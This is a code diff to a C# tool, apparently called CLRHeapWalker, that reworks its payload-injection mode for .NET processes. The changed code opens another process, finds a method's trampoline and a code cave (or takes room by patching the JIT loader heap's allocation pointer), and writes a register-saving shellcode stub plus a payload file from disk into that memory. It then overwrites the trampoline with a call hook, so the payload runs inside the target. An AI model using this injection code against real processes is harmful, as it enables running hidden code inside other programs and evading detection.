@@ -5,7 +5,6 @@ using Microsoft.Diagnostics.Runtime;
 using System.Diagnostics;
 using System.Reflection;
 using System.Runtime.InteropServices;
-using System.Security.Cryptography;
 using static CLRHeapWalker.CLRInternals;
 using static CLRHeapWalker.Win32Internals;
 
@@ -34,9 +33,8 @@ namespace CLRHeapWalker
                 Console.WriteLine($"<pid|process_name> --dump-heaps");
                 Console.WriteLine($"<pid|process_name> --dump-mt <method_table>");
                 Console.WriteLine($"<pid|process_name> --dump-md <method_desc>");
-                Console.WriteLine($"<pid|process_name> --find-jit");
-                Console.WriteLine($"<pid|process_name> --find-caves");
-                Console.WriteLine($"<pid|process_name> --jit-inject <payload path> <method_desc> [cave]");
+                Console.WriteLine($"<pid|process_name> --dump-trampolines");
+                Console.WriteLine($"<pid|process_name> --inject <payload path> <method_desc> [cave]");
                 Environment.Exit(1);
             }
 
@@ -110,6 +108,7 @@ namespace CLRHeapWalker
                             }
                             CloseHandle(hProcess);
                         }
+
                         if (args.Length >= 2 && args[1] == "--dump-obj")
                         {
                             if (args.Length >= 3 && args[2] == "--full")
@@ -127,7 +126,19 @@ namespace CLRHeapWalker
                             }
                         }
 
-                        if (args.Length >= 2 && args[1] == "--find-caves")
+                        if (args.Length >= 2 && args[1] == "--dump-trampolines")
+                        {
+                            bool jitOnly = false;
+                            if (args.Length >= 3 && args[2] == "--jit-only")
+                                jitOnly = true;
+                            var addrs = GetTrampolines(runtime, jitOnly);
+                            foreach (var addr in addrs)
+                            {
+                                Console.WriteLine($"{addr.Key} - 0x{addr.Value:X}");
+                            }
+                        }
+
+                        if (args.Length >= 2 && args[1] == "--dump-caves")
                         {
                             if (args.Length >= 3)
                                 DumpCodeCaves(pid, int.Parse(args[2]));
@@ -135,77 +146,13 @@ namespace CLRHeapWalker
                                 DumpCodeCaves(pid);
                         }
 
-                        if (args.Length >= 4 && args[1] == "--jit-inject")
+                        if (args.Length >= 4 && args[1] == "--inject")
                         {
-                            byte[] fileBytes = File.ReadAllBytes(args[2]);
-                            ulong nativeCodeAddr = 0;
-                            try
-                            {
-                                nativeCodeAddr = ulong.Parse(args[3], System.Globalization.NumberStyles.HexNumber);
-                            }
-                            catch (Exception ex) when (ex is FormatException || ex is ArgumentException)
-                            {
-                                GetJitAddrs(runtime).TryGetValue(args[3], out nativeCodeAddr);
-                            }
-
-                            if (nativeCodeAddr == 0)
-                            {
-                                Console.WriteLine("[-] Invalid target! Use either a method name or native code address");
-                                return;
-                            }
-
-                            var method = runtime.GetMethodByInstructionPointer(nativeCodeAddr);
-                            if (method == null)
-                            {
-                                Console.WriteLine("[-] Couldn't get from IP");
-                                return;
-                            }
-                            ulong method_size = 0;
-                            foreach (var item in method.ILOffsetMap)
-                            {
-                                method_size += item.EndAddress - item.StartAddress;
-                            }
-                            if (method_size < 12)
-                            {
-                                Console.WriteLine("[-] Native code is smaller than hook");
-                                return;
-                            }
-
-                            ulong caveAddr = 0;
-                            if (args.Length >= 5)
-                                caveAddr = Convert.ToUInt64(args[4], 16);
-
-                            IntPtr hProcess = OpenProcess(MAXIMUM_ALLOWED, false, pid);
-
-                            if (hProcess == IntPtr.Zero)
-                            {
-                                Console.WriteLine("[-] Failed to open the target process.");
-                                return;
-                            }
-
-                            // Read method's first 5 bytes
-                            byte[] methodHead = new byte[5];
-                            if (!ReadProcessMemory(hProcess, (IntPtr)nativeCodeAddr, methodHead, methodHead.Length, out _))
-                            {
-                                CloseHandle(hProcess);
-                                Console.WriteLine("[-] Failed to read process memory.");
-                                return;
-                            }
-                            else
-                            {
-                                Console.WriteLine($"[.] Method head: {BitConverter.ToString(methodHead).Replace("-", "")}");
-                            }
-
-                            byte[] hook = {
-                            0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, // movabs rax,0x1122334455667788
-                            0xFF, 0xD0                                                  // call rax
-                        };
-
                             // Shellcode prologue:
                             // Being overcautious here and saving volatile registers as well ...
-                            byte[] prologue = { 
+                            byte[] prologue = {
                                 0x58,                   //0:  58                      pop rax
-                                0x48, 0x83, 0xE8, 0x0C, //1:  48 83 e8 0c             sub    rax,0xc
+                                0x48, 0x83, 0xE8, 0x05, //1:  48 83 e8 05             sub    rax,0x05
                                 0x50,                   //5:  50                      push rax
                                 0x53,                   //6:  53                      push rbx
                                 0x51,                   //7:  51                      push rcx
@@ -221,24 +168,10 @@ namespace CLRHeapWalker
                                 0x41, 0x56,             //17: 41 56                   push r14
                                 0x41, 0x57 };           //19: 41 57                   push r15
 
-                            // Shellcode restore section
                             byte[] restore = {
-                            0x48, 0xB9,                                     //0:  movabs rcx,
-                            0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, //2:  method addr
-                            0x48, 0x89, 0x08,                               //10: mov QWORD PTR[rax],rcx
-                            0x48, 0xB9,                                     //13: movabs rcx,
-                            0xCC, 0xBB, 0xAA, 0x99, 0x88, 0x77, 0x66, 0x55, //15: method addr+4
-                            0x48, 0x89, 0x48, 0x04 };                       //23: mov    QWORD PTR [rax+0x4],rcx
-
-                            // Patch restore
-                            for (int i = 0; i < 8; i++)
-                            {
-                                restore[i + 2] = methodHead[i];
-                            }
-                            for (int i = 0; i < 8; i++)
-                            {
-                                restore[i + 15] = methodHead[i + 4];
-                            }
+                                0x48, 0xB9, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, //0:  48 b9 88 77 66 55 44 33 22 11   movabs rcx,0x1122334455667788
+                                0x48, 0x89, 0x08                                            //a: 48 89 08                         mov QWORD PTR[rax],rcx
+                            };
 
                             // call shellcode
                             byte[] callPayload = {
@@ -247,42 +180,87 @@ namespace CLRHeapWalker
                             0x48, 0x83, 0xC4, 0x40 };     // add rsp,0x40
 
                             // Shellcode epilogue
-                            //0:  41 5f                   pop r15
-                            //2:  41 5e                   pop r14
-                            //4:  41 5d                   pop r13
-                            //6:  41 5c                   pop r12
-                            //8:  41 5b                   pop r11
-                            //a:  41 5a                   pop r10
-                            //c:  41 59                   pop r9
-                            //e: 41 58                    pop r8
-                            //10: 5e                      pop rsi
-                            //11: 5f                      pop rdi
-                            //12: 5a                      pop rdx
-                            //13: 59                      pop rcx
-                            //14: 5b                      pop rbx
-                            //15: 58                      pop rax
-                            //16: ff e0                   jmp rax
-                            byte[] epilogue = { 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5E, 0x5F, 0x5A, 0x59, 0x5B, 0x58, 0xFF, 0xE0 };
+
+                            byte[] epilogue = {
+                                0x41, 0x5F, //0:  41 5f                   pop r15
+                                0x41, 0x5E, //2:  41 5e                   pop r14
+                                0x41, 0x5D, //4:  41 5d                   pop r13
+                                0x41, 0x5C, //6:  41 5c                   pop r12
+                                0x41, 0x5B, //8:  41 5b                   pop r11
+                                0x41, 0x5A, //a:  41 5a                   pop r10
+                                0x41, 0x59, //c:  41 59                   pop r9
+                                0x41, 0x58, //e: 41 58                    pop r8
+                                0x5E,       //10: 5e                      pop rsi
+                                0x5F,       //11: 5f                      pop rdi
+                                0x5A,       //12: 5a                      pop rdx
+                                0x59,       //13: 59                      pop rcx
+                                0x5B,       //14: 5b                      pop rbx
+                                0x58,       //15: 58                      pop rax
+                                0xFF, 0xE0  //16: ff e0                   jmp rax
+                            };
 
                             byte[] nopSled = new byte[0];
                             for (int i = 0; i < nopSled.Length; i++)
                             {
                                 nopSled[i] = 0x90;
                             }
+
+
+                            byte[] fileBytes = File.ReadAllBytes(args[2]);
+                            ulong trampolineAddr = 0;
                             try
                             {
+                                trampolineAddr = ulong.Parse(args[3], System.Globalization.NumberStyles.HexNumber);
+                            }
+                            catch (Exception ex) when (ex is FormatException || ex is ArgumentException)
+                            {
+                                GetTrampolines(runtime).TryGetValue(args[3], out trampolineAddr);
+                            }
+
+                            if (trampolineAddr == 0)
+                            {
+                                Console.WriteLine("[-] Invalid target! Use either a method name or a trampoline address");
+                                return;
+                            }
+
+                            ulong caveAddr = 0;
+                            if (args.Length >= 5)
+                            {
+                                try
+                                {
+                                    caveAddr = Convert.ToUInt64(args[4], 16);
+                                }
+                                catch (Exception)
+                                {
+                                    Console.WriteLine("[-] Invalid cave address.");
+                                    return;
+                                }
+                            }
+
+                            IntPtr hProcess = OpenProcess(MAXIMUM_ALLOWED, false, pid);
+
+                            if (hProcess == IntPtr.Zero)
+                            {
+                                Console.WriteLine("[-] Failed to open the target process.");
+                                return;
+                            }
+                            try
+                            {
+                                // Read method's first 8 bytes
+                                byte[] methodHead = new byte[8];
+                                if (!ReadProcessMemory(hProcess, (IntPtr)trampolineAddr, methodHead, methodHead.Length, out _))
+                                {
+                                    CloseHandle(hProcess);
+                                    Console.WriteLine("[-] Failed to read process memory.");
+                                    return;
+                                }
+                                else
+                                {
+                                    Console.WriteLine($"[.] Method head: {BitConverter.ToString(methodHead).Replace("-", "")}");
+                                }
+
                                 if (caveAddr == 0)
                                 {
-                                    //caveAddr = GetCodeCaves(pid,
-                                    //    prologue.Length +
-                                    //    restore.Length +
-                                    //    callPayload.Length +
-                                    //    epilogue.Length +
-                                    //    nopSled.Length +
-                                    //    fileBytes.Length
-                                    //    ).Last();
-
-
                                     // I took a naive approach here moving loaderHeap.m_pAllocPtr to loaderHeap.m_pEndReservedRegion.
                                     // This keeps the heap available and forces the JIT Manager to create a new heap for future allocations.
                                     // There is still a chance of a race condition if loaderHeap.m_pAllocPtr is updated before its patched.
@@ -295,22 +273,35 @@ namespace CLRHeapWalker
                                         nopSled.Length +
                                         fileBytes.Length;
                                     ulong availCommittedRegion = loaderHeap.m_pEndReservedRegion - loaderHeap.m_pAllocPtr;
+                                    Console.WriteLine($"[.] Payload size: {requiredSize} bytes");
+                                    Console.WriteLine($"[.] Code heap available committed region: {availCommittedRegion} bytes");
                                     if ((ulong)requiredSize > availCommittedRegion)
                                     {
                                         throw new Exception("Available commited region is not large enough for payload");
                                     }
-                                    if (!WriteBytesToProcessMemory(hProcess, (IntPtr)(loaderHeapAddr + 0x08), BitConverter.GetBytes(loaderHeap.m_pEndReservedRegion)))
+                                    if (!WriteBytesToProcessMemory(hProcess, (IntPtr)(loaderHeapAddr + 0x08), BitConverter.GetBytes(loaderHeap.m_pAllocPtr + (ulong)requiredSize)))
                                         throw new Exception("Failed to patch m_pAllocPtr");
                                     caveAddr = loaderHeap.m_pAllocPtr;
                                 }
 
-                                //Patch hook
-                                byte[] caveAddrBytes = BitConverter.GetBytes(caveAddr);
+                                long jmp = (long)(caveAddr - trampolineAddr - 0x5);
+                                Console.WriteLine($"[.] JMP from {trampolineAddr:X} to {caveAddr:X}: {jmp:X}");
+                                if (jmp > int.MaxValue || jmp < int.MinValue)
+                                {
+                                    Console.WriteLine("[-] Target is too far for a JMP.");
+                                    return;
+                                }
+
+                                byte[] hook = {
+                                0xE8, 0x40, 0x33, 0x22, 0x11 // call 0x11223344
+                            };
+
+
+                                // Patch restore
                                 for (int i = 0; i < 8; i++)
                                 {
-                                    hook[i + 2] = caveAddrBytes[i];
+                                    restore[i + 2] = methodHead[i];
                                 }
-                                Console.WriteLine($"[.] Patched hook: {BitConverter.ToString(caveAddrBytes).Replace("-", "")}");
 
                                 byte[] payload = prologue.Concat(restore).Concat(callPayload).Concat(epilogue).Concat(nopSled).Concat(fileBytes).ToArray();
                                 if (WriteBytesToProcessMemory(hProcess, (IntPtr)caveAddr, payload))
@@ -319,16 +310,24 @@ namespace CLRHeapWalker
                                 }
                                 else
                                 {
-                                    throw new Exception($"Failed writting payload to 0x{caveAddr:X}");
+                                    throw new Exception($"Failed writting payload to 0x{caveAddr:X} [{Marshal.GetLastWin32Error()}]");
                                 }
 
-                                if (WriteBytesToProcessMemory(hProcess, (IntPtr)nativeCodeAddr, hook))
+                                //Patch hook
+                                byte[] caveAddrBytes = BitConverter.GetBytes((int)jmp);
+                                for (int i = 0; i < 4; i++)
                                 {
-                                    Console.WriteLine($"[+] Hook written to 0x{nativeCodeAddr:X}");
+                                    hook[i + 1] = caveAddrBytes[i];
+                                }
+                                Console.WriteLine($"[.] Patched hook: {BitConverter.ToString(caveAddrBytes).Replace("-", "")}");
+
+                                if (WriteBytesToProcessMemory(hProcess, (IntPtr)trampolineAddr, hook))
+                                {
+                                    Console.WriteLine($"[+] Hook written to 0x{trampolineAddr:X}");
                                 }
                                 else
                                 {
-                                    throw new Exception($"Failed writting hook to 0x{nativeCodeAddr:X}");
+                                    throw new Exception($"Failed writting hook to 0x{trampolineAddr:X} [{Marshal.GetLastWin32Error()}]");
                                 }
                             }
                             catch (Exception ex)
@@ -372,7 +371,8 @@ namespace CLRHeapWalker
             int bytesWritten;
             return WriteProcessMemory(hProcess, remoteAddress, data, (uint)data.Length, out bytesWritten);
         }
-        static MEMORY_BASIC_INFORMATION[] GetRWXMemorySegments(int pid)
+
+        static MEMORY_BASIC_INFORMATION[] GetMemorySegments(int pid, int protection)
         {
             IntPtr process = IntPtr.Zero;
             IntPtr offset = IntPtr.Zero;
@@ -386,7 +386,7 @@ namespace CLRHeapWalker
                     while (VirtualQueryEx(process, offset, out MEMORY_BASIC_INFORMATION mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0)
                     {
                         offset = (IntPtr)((Int64)mbi.BaseAddress + (Int64)mbi.RegionSize);
-                        if (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE)
+                        if (mbi.AllocationProtect == protection && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE)
                         {
                             segments.Add(mbi);
                         }
@@ -399,6 +399,16 @@ namespace CLRHeapWalker
                 }
             }
             return segments.ToArray();
+        }
+
+        static MEMORY_BASIC_INFORMATION[] GetRWXMemorySegments(int pid)
+        {
+            return GetMemorySegments(pid, PAGE_EXECUTE_READWRITE);
+        }
+
+        static MEMORY_BASIC_INFORMATION[] GetRWMemorySegments(int pid)
+        {
+            return GetMemorySegments(pid, PAGE_READWRITE);
         }
 
         static void DumpCodeCaves(int pid, int size = 512)
@@ -509,6 +519,83 @@ namespace CLRHeapWalker
             });
         }
 
+        private static Dictionary<string, ulong> GetTrampolines(ClrRuntime runtime, bool jitOnly = false)
+        {
+            HashSet<ulong> mts = new HashSet<ulong>();
+            Dictionary<string, ulong> addrs = new Dictionary<string, ulong>();
+            foreach (ClrObject obj in runtime.Heap.EnumerateObjects())
+            {
+                if (obj.Type != null)
+                {
+                    mts.Add(obj.Type.MethodTable);
+                }
+            }
+
+            int pid = runtime.DataTarget.DataReader.ProcessId;
+            IntPtr hProcess = OpenProcess(MAXIMUM_ALLOWED, false, pid);
+            if (hProcess == IntPtr.Zero)
+            {
+                Console.WriteLine("[-] Failed to open the target process.");
+                return addrs;
+            }
+            try
+            {
+                foreach (var pMT in mts)
+                {
+                    MethodTable mt = ReadMemoryData<MethodTable>(hProcess, (IntPtr)pMT);
+                    ulong[] nonVirtualSlots = new ulong[mt.m_wNumVirtuals];
+
+                    uint slotCt = 0;
+                    for (ulong i = 0; i < mt.m_wNumVirtuals; i++)
+                    {
+                        ulong pSlots = ReadMemoryData<ulong>(hProcess, (IntPtr)(pMT + 0x40 + (i * 8)));
+                        for (ulong j = 0; j < 8; j++)
+                        {
+                            nonVirtualSlots[slotCt] = (ReadMemoryData<ulong>(hProcess, (IntPtr)(pSlots + (j * 8))));
+                            slotCt++;
+                            if (slotCt >= mt.m_wNumVirtuals)
+                                break;
+                        }
+                        if (slotCt >= mt.m_wNumVirtuals)
+                            break;
+                    }
+
+                    ClrType? clrType = runtime.GetTypeByMethodTable(pMT);
+                    if (clrType == null)
+                    {
+                        continue;
+                    }
+                    foreach (ClrMethod method in clrType.Methods)
+                    {
+                        CoreClrMethodDesc methodDesc = ReadMemoryData<CoreClrMethodDesc>(hProcess, (IntPtr)method.MethodDesc);
+                        if (method.CompilationType != MethodCompilationType.None)
+                        {
+                            if (jitOnly && method.CompilationType != MethodCompilationType.Jit)
+                            {
+                                continue;
+                            }
+                            if ((methodDesc.m_wFlags & mdcHasNonVtableSlot) == mdcHasNonVtableSlot)
+                            {
+                                addrs[$"{method.Signature}"] = methodDesc.TempEntry;
+                            }
+                            else
+                            {
+                                if (methodDesc.m_wSlotNumber < mt.m_wNumVirtuals)
+                                {
+                                    addrs[$"{method.Signature}"] = nonVirtualSlots[methodDesc.m_wSlotNumber];
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            finally
+            {
+                CloseHandle(hProcess);
+            }
+            return addrs;
+        }
+
         private static Dictionary<string, ulong> GetJitAddrs(ClrRuntime runtime)
         {
             HashSet<ulong> mts = new HashSet<ulong>();
@@ -593,7 +680,7 @@ namespace CLRHeapWalker
                 Console.WriteLine("\nMethod Descs:");
                 foreach (ClrMethod method in clrType.Methods)
                 {
-                    Console.WriteLine($"    {method.MethodDesc:x16} {method.Name}");
+                    Console.WriteLine($"    {method.MethodDesc:x16} {method.Signature}");
                     if (detailed)
                     {
                         DumpMd(runtime, method.MethodDesc);
